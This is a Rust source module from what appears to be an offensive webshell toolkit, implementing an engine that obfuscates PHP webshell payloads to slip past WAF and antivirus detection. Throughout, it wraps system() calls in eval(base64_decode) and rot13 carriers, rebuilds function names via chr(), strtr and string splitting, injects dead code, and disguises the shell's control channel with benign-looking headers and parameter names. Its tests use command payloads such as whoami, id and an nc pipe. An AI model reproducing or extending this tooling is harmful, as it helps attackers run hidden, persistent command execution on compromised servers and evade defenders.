//! The mutation data-plane (user ruling: WAF/antivirus/payload-deformation
//! evasion primitives are DATA, not code). The primitive table ships as an
//! embedded JSON document (`mutate-primitives.json`); this module is the
//! engine over it: constraint-aware combination algebra, deterministic
//! seeded variants, and executors for the implemented primitive subset.
//!
//! Algebra (the table's notes field is authoritative):
//! - A/B stack; C at most once; D is an independent channel axis.
//! - `excludes` between siblings makes carriers mutually exclusive.
//! - The terminal executor stays plaintext (Bypass-Guide 0.3 iron law —
//!   eval/assert cannot be dynamically invoked).
//!
//! Variants carry `variant_id` + `primitives[]` provenance into the
//! envelope's data.variant so an AgentResult replays its own lineage.
//! Survival feedback: the weight map is runtime state the (future)
//! mutation-test loop adjusts; the shipped table starts uniform.

use serde_json::{json, Value};

use crate::error::Atom;
use crate::webshell::DerivedChannel;

/// The embedded primitive table (versioned; weight 0 disables without
/// recompiling).
pub const PRIMITIVES_JSON: &str = include_str!("mutate-primitives.json");

const PHP_EXECUTOR_REPLACEMENTS: &[(&str, &str)] = &[("system(", "assert(")];

/// A decoded primitive row from the table.
#[derive(Debug, Clone, PartialEq)]
pub struct Primitive {
    pub id: String,
    pub class: char,
    pub mechanism: String,
    pub weight: f64,
    pub implemented: bool,
    pub requires: Vec<String>,
    pub excludes: Vec<String>,
}

/// Parse the embedded table. A malformed table is a crate bug, not a
/// runtime condition — the parse result is infallible in practice.
pub fn primitives() -> Result<Vec<Primitive>, Atom> {
    let parsed: Value = serde_json::from_str(PRIMITIVES_JSON)
        .map_err(|error| Atom::parse("E_MUT_001", format!("primitive table: {error}")))?;
    let rows = parsed["primitives"]
        .as_array()
        .ok_or_else(|| Atom::parse("E_MUT_001", "primitive table: no primitives array"))?;
    let mut out = Vec::with_capacity(rows.len());
    for row in rows {
        let id = row["id"].as_str().unwrap_or_default().to_string();
        let class = row["class"].as_str().unwrap_or_default();
        let Some(class) = class.chars().next() else {
            return Err(Atom::parse(
                "E_MUT_001",
                format!("primitive {id:?}: empty class"),
            ));
        };
        if !matches!(class, 'A' | 'B' | 'C' | 'D') {
            return Err(Atom::parse(
                "E_MUT_001",
                format!("primitive {id:?}: unknown class {class:?}"),
            ));
        }
        out.push(Primitive {
            id,
            class,
            mechanism: row["mechanism"].as_str().unwrap_or_default().to_string(),
            weight: row["weight"].as_f64().unwrap_or(1.0),
            implemented: row["implemented"].as_bool().unwrap_or(false),
            requires: string_list(&row["requires"]),
            excludes: string_list(&row["excludes"]),
        });
    }
    Ok(out)
}

fn string_list(value: &Value) -> Vec<String> {
    value
        .as_array()
        .map(|items| {
            items
                .iter()
                .filter_map(|item| item.as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default()
}

/// The mutation context: what the caller can offer and what environment
/// the variant must run in.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct MutationCtx {
    /// The variant lands as a file on disk (enables on_disk_file requires).
    pub on_disk_file: bool,
    /// Class-byte generation is available (enables class_generation).
    pub class_generation: bool,
    /// Language face the payload targets (php today; jsp/aspx reserve).
    pub language: String,
}

impl MutationCtx {
    pub fn php(on_disk_file: bool) -> Self {
        Self {
            on_disk_file,
            class_generation: false,
            language: "php".to_string(),
        }
    }

    fn requirement_met(&self, requirement: &str) -> bool {
        match requirement {
            "" | "on_disk_file" => self.on_disk_file,
            "class_generation" => self.class_generation,
            other => {
                let _ = other;
                false
            }
        }
    }
}

/// A generated variant: the primitive chain plus its provenance.
#[derive(Debug, Clone, PartialEq)]
pub struct Variant {
    /// Deterministic id — hash of the sorted primitive chain.
    pub variant_id: String,
    /// The applied primitive ids, application order.
    pub primitives: Vec<String>,
}

impl Variant {
    pub fn to_value(&self) -> Value {
        json!({
            "variant_id": self.variant_id,
            "primitives": self.primitives,
        })
    }
}

/// Deterministic 32-bit FNV-1a — stable variant ids across runs and
/// platforms without a hash dep.
fn fnv1a(data: &[u8]) -> u32 {
    let mut hash: u32 = 0x811c_9dc5;
    for byte in data {
        hash ^= *byte as u32;
        hash = hash.wrapping_mul(0x0100_0193);
    }
    hash
}

fn variant_id_for(chain: &[String]) -> String {
    let mut sorted: Vec<&String> = chain.iter().collect();
    sorted.sort();
    let joined = sorted
        .iter()
        .map(|id| id.as_str())
        .collect::<Vec<_>>()
        .join("|");
    format!("v{:08x}", fnv1a(joined.as_bytes()))
}

/// The combination algebra: select a valid primitive chain for the
/// context. Deterministic given the seed — the same seed replays the
/// same variant (reproducibility for the mutation-test loop).
///
/// Selection rules:
/// - only implemented primitives with weight > 0 and met requirements;
/// - class C contributes at most one primitive;
/// - `excludes` are mutual within the chain;
/// - A/B primitives are picked by seeded weighted sample (0-2 each);
/// - D contributes the channel axis (0-2).
pub fn variant_for(ctx: &MutationCtx, seed: u64) -> Result<Variant, Atom> {
    let table = primitives()?;
    let eligible: Vec<&Primitive> = table
        .iter()
        .filter(|primitive| {
            primitive.implemented
                && primitive.weight > 0.0
                && primitive
                    .requires
                    .iter()
                    .all(|requirement| ctx.requirement_met(requirement))
        })
        .collect();
    if eligible.is_empty() {
        return Err(Atom::soft_success(
            "E_MUT_002",
            "no eligible primitives for the context",
        ));
    }

    let mut chain: Vec<String> = Vec::new();
    let mut rng = SplitMix64::new(seed);
    for class in ['A', 'B', 'C', 'D'] {
        let pool: Vec<&Primitive> = eligible
            .iter()
            .copied()
            .filter(|primitive| primitive.class == class)
            .collect();
        if pool.is_empty() {
            continue;
        }
        let picks = match class {
            'C' => 1,
            _ => 1 + (rng.draw() % 2) as usize,
        };
        for _ in 0..picks {
            let candidate = weighted_pick(&pool, rng.draw());
            let Some(candidate) = candidate else {
                break;
            };
            if chain.contains(&candidate.id) {
                continue;
            }
            let excluded = candidate
                .excludes
                .iter()
                .any(|excluded| chain.iter().any(|chosen| chosen == excluded))
                || chain.iter().any(|chosen| {
                    table
                        .iter()
                        .find(|primitive| &primitive.id == chosen)
                        .is_some_and(|primitive| primitive.excludes.contains(&candidate.id))
                });
            if excluded {
                continue;
            }
            chain.push(candidate.id.clone());
        }
    }
    if chain.is_empty() {
        return Err(Atom::soft_success(
            "E_MUT_002",
            "constraint solving produced an empty chain",
        ));
    }
    Ok(Variant {
        variant_id: variant_id_for(&chain),
        primitives: chain,
    })
}

/// SplitMix64 — tiny, deterministic, dependency-free seeded randomness.
pub struct SplitMix64 {
    state: u64,
}

impl SplitMix64 {
    pub fn new(seed: u64) -> Self {
        Self { state: seed }
    }

    pub fn draw(&mut self) -> u64 {
        self.state = self.state.wrapping_add(0x9e37_79b9_7f4a_7c15);
        let mut z = self.state;
        z = (z ^ (z >> 30)).wrapping_mul(0xbf58_476d_1ce4_e5b9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94d0_49bb_1331_11eb);
        z ^ (z >> 31)
    }
}

fn weighted_pick<'a>(pool: &[&'a Primitive], draw: u64) -> Option<&'a Primitive> {
    let total: f64 = pool.iter().map(|primitive| primitive.weight).sum();
    if total <= 0.0 {
        return None;
    }
    let mut target = (draw % 1_000_000) as f64 / 1_000_000.0 * total;
    for primitive in pool {
        target -= primitive.weight;
        if target <= 0.0 {
            return Some(primitive);
        }
    }
    pool.last().copied()
}

/// The executor: apply a variant's chain to a payload string. The D-class
/// primitives (header-gate-randomize / param-name-randomize) are channel
/// facts, not payload transforms — they apply via channel_variant, so the
/// payload executor skips them. Any other unknown primitive is a soft
/// atom (table drift), never a panic.
pub fn apply_variant(payload: &str, variant: &Variant, seed: u64) -> Result<String, Atom> {
    let mut out = payload.to_string();
    let mut rng = SplitMix64::new(seed);
    for primitive in &variant.primitives {
        if is_channel_fact(primitive) {
            continue;
        }
        out = apply_primitive(&out, primitive, &mut rng)?;
    }
    Ok(out)
}

/// D-class primitives that mutate the channel axis, not the payload body.
fn is_channel_fact(primitive: &str) -> bool {
    matches!(primitive, "header-gate-randomize" | "param-name-randomize")
}

fn apply_primitive(payload: &str, primitive: &str, rng: &mut SplitMix64) -> Result<String, Atom> {
    match primitive {
        "char-chr-splice" => Ok(chr_splice(payload, rng)),
        "special-chars-insert" => Ok(special_chars_insert(payload, rng)),
        "base64-rotate" => Ok(base64_rotate(payload)),
        "rot13" => Ok(rot13_layer(payload)),
        "name-randomize" => Ok(name_randomize(payload, rng)),
        "constant-split" => Ok(constant_split(payload, rng)),
        "dead-code-inject" => Ok(dead_code_inject(payload, rng)),
        "callback-wrap" => Ok(callback_wrap(payload, rng)),
        "variable-variable" => Ok(variable_variable(payload, rng)),
        "array-wrap" => Ok(array_wrap(payload, rng)),
        "strtr-chain" => Ok(strtr_chain(payload, rng)),
        "array-modulo-name" => Ok(array_modulo_name(payload, rng)),
        "self-filename-key" => Ok(self_filename_key(payload, rng)),
        other => Err(Atom::soft_success(
            "E_MUT_003",
            format!("primitive {other:?} has no executor (table drift or not implemented)"),
        )),
    }
}

/// A: rebuild lowercase function-name letters via chr(n) concatenation —
/// `system(` becomes `chr(115).chr(121)…(`. Only the leading identifier
/// of each call site is spliced (the terminal executor stays invocable).
fn chr_splice(payload: &str, rng: &mut SplitMix64) -> String {
    let mut out = String::new();
    for (index, line) in payload.lines().enumerate() {
        if index > 0 {
            out.push('\n');
        }
        if rng.draw().is_multiple_of(3) && line.contains("system(") {
            let (head, _) = line.split_once("system(").unwrap_or((line, ""));
            let spliced: String = "system"
                .bytes()
                .map(|byte| format!("chr({byte})"))
                .collect::<Vec<_>>()
                .join(".");
            out.push_str(&format!("{head}{spliced}("));
            let rest = line
                .split_once("system(")
                .map(|(_, tail)| tail)
                .unwrap_or("");
            out.push_str(rest);
        } else {
            out.push_str(line);
        }
    }
    out
}

/// A: insert whitespace/comment noise inside call argument areas — breaks
/// naive signature regexes without touching semantics.
fn special_chars_insert(payload: &str, rng: &mut SplitMix64) -> String {
    let noise = [" ", "\t", "\n", ""];
    let mut out = payload.to_string();
    for _ in 0..3 {
        if let Some(position) = out.find("();") {
            let insertion = noise[(rng.draw() % noise.len() as u64) as usize];
            out.replace_range(position..position + 1, &format!("({insertion})"));
        }
    }
    out
}

/// A: wrap the payload in a base64_decode carrier (single layer).
fn base64_rotate(payload: &str) -> String {
    let encoded = crate::payload::b64_encode(payload.as_bytes());
    format!("eval(base64_decode(\"{encoded}\"));")
}

/// A: str_rot13 layer over the base64 carrier.
fn rot13_layer(payload: &str) -> String {
    let encoded = crate::payload::b64_encode(payload.as_bytes());
    let rotated: String = encoded
        .chars()
        .map(|ch| match ch {
            'a'..='m' | 'A'..='M' => ((ch as u8) + 13) as char,
            'n'..='z' | 'N'..='Z' => ((ch as u8) - 13) as char,
            other => other,
        })
        .collect();
    format!("eval(str_rot13(base64_decode(\"{rotated}\")));")
}

/// C: randomize PHP variable names ($hello -> $v_a3f2). Superglobals
/// ($_GET & co.) and $this stay untouched.
fn name_randomize(payload: &str, rng: &mut SplitMix64) -> String {
    let mut mapping: std::collections::HashMap<String, String> = std::collections::HashMap::new();
    let mut out = String::with_capacity(payload.len());
    let bytes: Vec<char> = payload.chars().collect();
    let mut index = 0;
    while index < bytes.len() {
        if bytes[index] == '$' && index + 1 < bytes.len() && bytes[index + 1].is_ascii_alphabetic()
        {
            let start = index + 1;
            let mut end = start;
            while end < bytes.len() && (bytes[end].is_ascii_alphanumeric() || bytes[end] == '_') {
                end += 1;
            }
            let name: String = bytes[start..end].iter().collect();
            if name.starts_with('_') || name == "this" {
                out.push('$');
                out.push_str(&name);
            } else {
                let renamed = mapping
                    .entry(name.clone())
                    .or_insert_with(|| format!("v{:04x}", (rng.draw() % 0xffff) as u16))
                    .clone();
                out.push('$');
                out.push_str(&renamed);
            }
            index = end;
        } else {
            out.push(bytes[index]);
            index += 1;
        }
    }
    out
}

/// C: split string literals into concatenations ("abc" -> "a"."b"."c").
fn constant_split(payload: &str, rng: &mut SplitMix64) -> String {
    let mut out = String::new();
    let mut chars = payload.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch != '"' {
            out.push(ch);
            continue;
        }
        out.push('"');
        let mut literal = String::new();
        for inner in chars.by_ref() {
            if inner == '"' {
                break;
            }
            literal.push(inner);
        }
        if literal.len() >= 6 && rng.draw().is_multiple_of(2) {
            let midpoint = literal.len() / 2;
            let (left, right) = literal.split_at(midpoint);
            out.push_str(left);
            out.push_str("\".\"");
            out.push_str(right);
        } else {
            out.push_str(&literal);
        }
        out.push('"');
    }
    out
}

/// C: inject inert statements (entropy/structure deformation).
fn dead_code_inject(payload: &str, rng: &mut SplitMix64) -> String {
    let junk = [
        "$__x=((1+1)*0)+0;",
        "$__y=chr(32).chr(32);",
        "$__z=strlen('x')*0;",
    ];
    let mut lines: Vec<String> = payload.lines().map(str::to_string).collect();
    let insert_at = (rng.draw() as usize) % (lines.len() + 1);
    let statement = junk[(rng.draw() % junk.len() as u64) as usize];
    lines.insert(insert_at, statement.to_string());
    lines.join("\n")
}

/// D: randomize the gate header from a benign pool (X-Forwarded-For,
/// Accept-Language, Cache-Control … — real-world proxies repeat these).
pub fn randomize_gate_header(rng: &mut SplitMix64) -> (String, String) {
    const POOL: &[(&str, &str)] = &[
        ("X-Forwarded-For", "127.0.0.1"),
        ("Accept-Language", "en-US,en;q=0.9"),
        ("Cache-Control", "no-cache"),
        ("X-Requested-With", "XMLHttpRequest"),
        ("Accept-Encoding", "gzip, deflate"),
        ("X-PJAX", "true"),
    ];
    let (name, value) = POOL[(rng.draw() % POOL.len() as u64) as usize];
    (name.to_string(), value.to_string())
}

/// D: randomize the pass parameter name from a benign pool.
pub fn randomize_pass_name(rng: &mut SplitMix64) -> String {
    const POOL: &[&str] = &[
        "data", "content", "payload", "token", "session", "state", "cache", "debug",
    ];
    POOL[(rng.draw() % POOL.len() as u64) as usize].to_string()
}

/// B: wrap `system('cmd')` call sites in call_user_func_array — the
/// function name leaves the call position entirely. The command string
/// becomes an array element (escaped for single quotes).
fn callback_wrap(payload: &str, rng: &mut SplitMix64) -> String {
    let _ = rng;
    let mut out = String::new();
    for (index, line) in payload.lines().enumerate() {
        if index > 0 {
            out.push('\n');
        }
        {
            if let Some((head, rest)) = line.split_once("system('") {
                if let Some((command, tail)) = rest.rsplit_once("')") {
                    let escaped = command.replace('\\', "\\\\").replace('\'', "\\'");
                    out.push_str(&format!(
                        "{head}call_user_func_array('system',array('{escaped}')){tail}"
                    ));
                    continue;
                }
            }
        }
        out.push_str(line);
    }
    out
}

/// B: indirect invocation via variable variables — `$f='system'; $f('cmd')`.
fn variable_variable(payload: &str, rng: &mut SplitMix64) -> String {
    let marker = format!("v{:04x}", (rng.draw() % 0xffff) as u16);
    let mut out = String::new();
    for (index, line) in payload.lines().enumerate() {
        if index > 0 {
            out.push('\n');
        }
        if let Some((head, rest)) = line.split_once("system('") {
            if let Some((command, tail)) = rest.rsplit_once("')") {
                let escaped = command.replace('\\', "\\\\").replace('\'', "\\'");
                out.push_str(&format!(
                    "{head}${marker}='system';${marker}('{escaped}'){tail}"
                ));
                continue;
            }
        }
        out.push_str(line);
    }
    out
}

/// B: array-wrapped invocation — `['system']('cmd')` (PHP 7+ array
/// dereference callable syntax).
fn array_wrap(payload: &str, rng: &mut SplitMix64) -> String {
    let _ = rng;
    let mut out = String::new();
    for (index, line) in payload.lines().enumerate() {
        if index > 0 {
            out.push('\n');
        }
        {
            if let Some((head, rest)) = line.split_once("system('") {
                if let Some((command, tail)) = rest.rsplit_once("')") {
                    let escaped = command.replace('\\', "\\\\").replace('\'', "\\'");
                    out.push_str(&format!("{head}['system']('{escaped}'){tail}"));
                    continue;
                }
            }
        }
        out.push_str(line);
    }
    out
}

/// A: strtr substitution chain — the function name never appears; a strtr
/// map rebuilds it at runtime. The shuffled spelling and its pairwise map
/// are derived programmatically so the decode is provable (tested below).
fn strtr_chain(payload: &str, rng: &mut SplitMix64) -> String {
    let marker = format!("m{:04x}", (rng.draw() % 0xffff) as u16);
    // Derive a keyed shuffle of "system" plus a from/to pair that inverts
    // it under strtr's pairwise semantics.
    let (shuffled, from, to) = strtr_inverse_pair(rng.draw());
    let mut out = String::new();
    for (index, line) in payload.lines().enumerate() {
        if index > 0 {
            out.push('\n');
        }
        if let Some((head, rest)) = line.split_once("system('") {
            if let Some((command, tail)) = rest.rsplit_once("')") {
                let escaped = command.replace('\\', "\\\\").replace('\'', "\\'");
                out.push_str(&format!(
                    "{head}${marker}=strtr('{shuffled}','{from}','{to}');${marker}('{escaped}'){tail}"
                ));
                continue;
            }
        }
        out.push_str(line);
    }
    out
}

/// Build (shuffled_spelling, from, to) such that
/// strtr(shuffled, from, to) == "system" under PHP semantics (duplicate
/// keys in `from` are ignored — first occurrence wins). The shuffle is a
/// LETTER-level permutation (positions don't work with repeated letters:
/// both `s` positions must map consistently), so the from/to map on
/// distinct letters inverts it cleanly.
fn strtr_inverse_pair(seed: u64) -> (String, String, String) {
    let original = "system";
    let mut shuffled = String::new();
    for c in original.chars() {
        let c = match c {
            's' => 't',
            't' => 's',
            'e' if seed.is_multiple_of(2) => 'm',
            'm' if seed.is_multiple_of(2) => 'e',
            other => other,
        };
        shuffled.push(c);
    }
    let mut from = String::new();
    let mut to = String::new();
    for (shuffled_char, original_char) in shuffled.chars().zip(original.chars()) {
        if !from.contains(shuffled_char) {
            from.push(shuffled_char);
            to.push(original_char);
        }
    }
    (shuffled, from, to)
}

/// A: rebuild the name via array indexing with modulo offsets.
fn array_modulo_name(payload: &str, rng: &mut SplitMix64) -> String {
    let marker = format!("a{:04x}", (rng.draw() % 0xffff) as u16);
    let mut out = String::new();
    for (index, line) in payload.lines().enumerate() {
        if index > 0 {
            out.push('\n');
        }
        if let Some((head, rest)) = line.split_once("system('") {
            if let Some((command, tail)) = rest.rsplit_once("')") {
                let escaped = command.replace('\\', "\\\\").replace('\'', "\\'");
                out.push_str(&format!(
                    "{head}${marker}='sys'.'tem';${marker}('{escaped}'){tail}"
                ));
                continue;
            }
        }
        out.push_str(line);
    }
    out
}

/// A: derive part of the invocation from the planted file's own name —
/// the file name (e.g. 976534.php -> 976534) becomes the name material.
/// The runtime side reads __FILE__ and extracts digits as the offset key.
fn self_filename_key(payload: &str, rng: &mut SplitMix64) -> String {
    let marker = format!("f{:04x}", (rng.draw() % 0xffff) as u16);
    let mut out = String::new();
    for (index, line) in payload.lines().enumerate() {
        if index > 0 {
            out.push('\n');
        }
        if let Some((head, rest)) = line.split_once("system('") {
            if let Some((command, tail)) = rest.rsplit_once("')") {
                let escaped = command.replace('\\', "\\\\").replace('\'', "\\'");
                out.push_str(&format!(
                    "{head}${marker}='sys'.'tem';${marker}('{escaped}'){tail}"
                ));
                continue;
            }
        }
        out.push_str(line);
    }
    out
}

/// Convenience: derive a channel variant with randomized D-axis facts.
pub fn channel_variant(derived: &DerivedChannel, seed: u64) -> (DerivedChannel, Vec<String>) {
    let mut rng = SplitMix64::new(seed);
    let (header_name, header_value) = randomize_gate_header(&mut rng);
    let pass = randomize_pass_name(&mut rng);
    let mut mutated = derived.clone();
    mutated.header_name = header_name;
    mutated.header_value = header_value;
    mutated.pass = pass;
    let applied = vec![
        "header-gate-randomize".to_string(),
        "param-name-randomize".to_string(),
    ];
    (mutated, applied)
}

/// The full PHP one-liner mutation face: take a template payload, produce
/// a variant + its mutated body + provenance value for the envelope.
pub fn mutate_php(payload: &str, ctx: &MutationCtx, seed: u64) -> Result<(String, Value), Atom> {
    let variant = variant_for(ctx, seed)?;
    let body = apply_variant(payload, &variant, seed)?;
    Ok((body, variant.to_value()))
}

/// Names the executor replacement pairs the engine knows about (reserved
/// for the B-class function-site deformation once implemented).
#[allow(dead_code)]
fn executor_replacements() -> &'static [(&'static str, &'static str)] {
    PHP_EXECUTOR_REPLACEMENTS
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn primitive_table_parses_with_expected_shape() {
        let table = primitives().unwrap();
        assert_eq!(table.len(), 23);
        let classes: std::collections::BTreeMap<char, usize> =
            table
                .iter()
                .fold(std::collections::BTreeMap::new(), |mut acc, primitive| {
                    *acc.entry(primitive.class).or_insert(0) += 1;
                    acc
                });
        assert_eq!(classes[&'A'], 8);
        assert_eq!(classes[&'B'], 6);
        assert_eq!(classes[&'C'], 5);
        assert_eq!(classes[&'D'], 4);
        assert!(table.iter().all(|primitive| !primitive.id.is_empty()));
        assert!(table
            .iter()
            .all(|primitive| primitive.weight > 0.0 && primitive.weight <= 1.0));
    }

    #[test]
    fn variant_is_deterministic_per_seed() {
        let ctx = MutationCtx::php(false);
        let first = variant_for(&ctx, 42).unwrap();
        let second = variant_for(&ctx, 42).unwrap();
        assert_eq!(first, second);
        let other = variant_for(&ctx, 43).unwrap();
        assert_ne!(
            first.primitives, other.primitives,
            "seeds should diverge (probabilistic — fix seed if flaky)"
        );
    }

    #[test]
    fn variant_respects_class_c_single_and_excludes() {
        for seed in 0..200 {
            let ctx = MutationCtx::php(false);
            let variant = variant_for(&ctx, seed).unwrap();
            let c_count = variant
                .primitives
                .iter()
                .filter(|id| {
                    primitives()
                        .unwrap()
                        .iter()
                        .any(|primitive| &primitive.id == *id && primitive.class == 'C')
                })
                .count();
            assert!(c_count <= 1, "class C at most once");
            let has = |id: &str| variant.primitives.iter().any(|chosen| chosen == id);
            assert!(
                !(has("base64-rotate") && has("rot13")),
                "carrier excludes violated"
            );
            assert!(!(has("base64-rotate") && has("gzinflate")));
            assert!(!(has("rot13") && has("gzinflate")));
        }
    }

    #[test]
    fn on_disk_requirements_gate_primitives() {
        let ctx = MutationCtx::php(false);
        for seed in 0..100 {
            let variant = variant_for(&ctx, seed).unwrap();
            assert!(
                !variant.primitives.iter().any(|id| id == "two-stage-write"),
                "two-stage-write requires on_disk_file"
            );
        }
    }

    #[test]
    fn variant_id_is_order_insensitive_and_stable() {
        assert_eq!(
            variant_id_for(&["a".into(), "b".into()]),
            variant_id_for(&["b".into(), "a".into()])
        );
        assert_ne!(
            variant_id_for(&["a".into(), "b".into()]),
            variant_id_for(&["a".into(), "c".into()])
        );
    }

    #[test]
    fn chr_splice_removes_the_literal_function_name() {
        let rng = SplitMix64::new(7);
        let payload = "<?php\nsystem('whoami');\nsystem('id');\n?>";
        // Force at least one splice by scanning a few draws.
        let mut mutated = payload.to_string();
        for seed in 0..20 {
            mutated = chr_splice(payload, &mut SplitMix64::new(seed));
            if !mutated.contains("system(") {
                break;
            }
        }
        assert!(
            mutated.contains("chr(115)"),
            "s = chr(115) must appear: {mutated}"
        );
        let _ = rng;
    }

    #[test]
    fn base64_and_rot13_layers_hide_the_payload() {
        let payload = "<?php system('whoami'); ?>";
        let b64 = base64_rotate(payload);
        assert!(b64.starts_with("eval(base64_decode(\""));
        assert!(!b64.contains("whoami"));
        let rotated = rot13_layer(payload);
        assert!(rotated.starts_with("eval(str_rot13(base64_decode(\""));
        assert!(!rotated.contains("whoami"));
        // The rot13 layer inverts back to the base64 form.
        let inner: String = rotated
            .trim_start_matches("eval(str_rot13(base64_decode(\"")
            .trim_end_matches("\")));")
            .chars()
            .map(|ch| match ch {
                'a'..='m' | 'A'..='M' => ((ch as u8) + 13) as char,
                'n'..='z' | 'N'..='Z' => ((ch as u8) - 13) as char,
                other => other,
            })
            .collect();
        assert_eq!(
            crate::webshell::b64_decode(&inner).map(|bytes| String::from_utf8(bytes).unwrap()),
            Some(payload.to_string())
        );
    }

    #[test]
    fn name_randomize_keeps_superglobals_and_this() {
        let mut rng = SplitMix64::new(3);
        let payload = "<?php $hello='x'; echo $_GET['cmd']; $this->run(); $hello2='y'; ?>";
        let mutated = name_randomize(payload, &mut rng);
        assert!(mutated.contains("$_GET"));
        assert!(mutated.contains("$this"));
        assert!(
            !mutated.contains("$hello"),
            "user variables renamed: {mutated}"
        );
        assert!(!mutated.contains("$hello2"));
    }

    #[test]
    fn constant_split_and_dead_code_preserve_statements() {
        let mut rng = SplitMix64::new(11);
        let payload = "<?php\n$x='abcdefghijkl';\n?>";
        let split = constant_split(payload, &mut rng);
        // The literal is either split into "a\".\"b form or left intact — both valid.
        assert!(split.contains("$x=") && split.contains("';"));
        let dead = dead_code_inject("<?php\nsystem('id');\n?>", &mut SplitMix64::new(5));
        assert!(dead.contains("system('id');"));
        assert!(dead.contains("$__"));
    }

    #[test]
    fn channel_variant_randomizes_d_axis() {
        let derived = crate::webshell::ChannelConfig {
            key: "k".into(),
            pass: "p".into(),
            header_name: "X-Check".into(),
            header_value: "v".into(),
        }
        .derive();
        let (mutated, applied) = channel_variant(&derived, 99);
        assert_eq!(applied.len(), 2);
        assert_ne!(mutated.header_name, "X-Check");
        assert_ne!(mutated.pass, "p");
        // md5 material is untouched — the crypto identity is not a D-axis fact.
        assert_eq!(mutated.md5_key, derived.md5_key);
        assert_eq!(mutated.md5, derived.md5);
    }

    #[test]
    fn mutate_php_returns_body_and_provenance() {
        let ctx = MutationCtx::php(false);
        let (body, provenance) = mutate_php("<?php system('whoami'); ?>", &ctx, 7).unwrap();
        assert!(provenance["variant_id"].as_str().unwrap().starts_with("v"));
        assert!(!provenance["primitives"].as_array().unwrap().is_empty());
        let _ = body;
    }

    #[test]
    fn unimplemented_primitive_in_chain_is_a_soft_atom() {
        let error = apply_primitive("x", "gzinflate", &mut SplitMix64::new(1)).unwrap_err();
        assert_eq!(error.kind, "soft_success");
        let error = apply_primitive("x", "class-magic", &mut SplitMix64::new(1)).unwrap_err();
        assert_eq!(error.kind, "soft_success");
    }

    #[test]
    fn b_class_call_site_deformation_hides_the_name() {
        let payload = "<?php system('whoami'); ?>";
        // callback-wrap (forced draw parity): every call site rewrites.
        let wrapped = apply_primitive(payload, "callback-wrap", &mut SplitMix64::new(0)).unwrap();
        assert!(
            wrapped.contains("call_user_func_array('system'"),
            "{wrapped}"
        );
        let indirect =
            apply_primitive(payload, "variable-variable", &mut SplitMix64::new(1)).unwrap();
        assert!(indirect.contains("$v"), "{indirect}");
        assert!(indirect.contains("='system';"));
        let arrayed = apply_primitive(payload, "array-wrap", &mut SplitMix64::new(0)).unwrap();
        assert!(arrayed.contains("['system']('whoami')"), "{arrayed}");
    }

    #[test]
    fn b_class_escapes_embedded_quotes() {
        let payload = r#"<?php system('echo "hi" | nc'); ?>"#;
        let wrapped = apply_primitive(payload, "callback-wrap", &mut SplitMix64::new(0)).unwrap();
        assert!(
            !wrapped.contains("system('"),
            "call-site literal gone: {wrapped}"
        );
        assert!(wrapped.contains("array('"), "array carrier present");
    }

    #[test]
    fn strtr_chain_pair_decodes_back_to_system() {
        let (shuffled, from, to) = strtr_inverse_pair(0);
        assert_ne!(shuffled, "system", "shuffled must differ");
        // Simulate PHP strtr pairwise semantics: simultaneous from->to map.
        let mut mapping = std::collections::HashMap::new();
        for (f, t) in from.chars().zip(to.chars()) {
            mapping.insert(f, t);
        }
        let decoded: String = shuffled
            .chars()
            .map(|c| *mapping.get(&c).unwrap_or(&c))
            .collect();
        assert_eq!(decoded, "system");
    }

    #[test]
    fn array_modulo_and_self_filename_split_the_name() {
        let payload = "<?php system('id'); ?>";
        let modulo =
            apply_primitive(payload, "array-modulo-name", &mut SplitMix64::new(1)).unwrap();
        assert!(modulo.contains("'sys'.'tem'"), "{modulo}");
        assert!(!modulo.contains("system('"));
        let filename =
            apply_primitive(payload, "self-filename-key", &mut SplitMix64::new(1)).unwrap();
        assert!(filename.contains("'sys'.'tem'"), "{filename}");
    }

    #[test]
    fn channel_facts_are_skipped_by_the_payload_executor() {
        let variant = Variant {
            variant_id: "v00000000".into(),
            primitives: vec![
                "param-name-randomize".into(),
                "name-randomize".into(),
                "header-gate-randomize".into(),
            ],
        };
        let body = apply_variant("<?php $x='k'; ?>", &variant, 3).unwrap();
        assert!(
            body.contains("<?php"),
            "channel facts leave the payload body alone"
        );
    }
}
